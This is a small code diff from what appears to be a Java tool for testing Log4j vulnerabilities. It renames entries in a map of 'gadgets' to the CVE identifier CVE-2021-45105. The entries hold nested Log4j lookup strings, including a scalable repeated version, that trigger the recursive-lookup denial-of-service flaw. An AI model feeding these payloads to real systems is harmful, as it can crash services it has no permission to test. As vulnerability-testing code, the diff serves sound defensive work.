@@ -54,11 +54,11 @@ public class Main implements Runnable {
             Log.printf(canary)
         );
         gadgets.put(
-            "LOG4J2-3230",
+            "CVE-2021-45105",
             Log.printf("${${::-${::-$${::-j}}}}")
         );
         gadgets.put(
-            "LOG4J2-3230-XXL",
+            "CVE-2021-45105-XXL",
             Log.printf("${" + "${::-".repeat(repeat) + "$${::-j}" + "}".repeat(repeat) + "}")
         );
     }
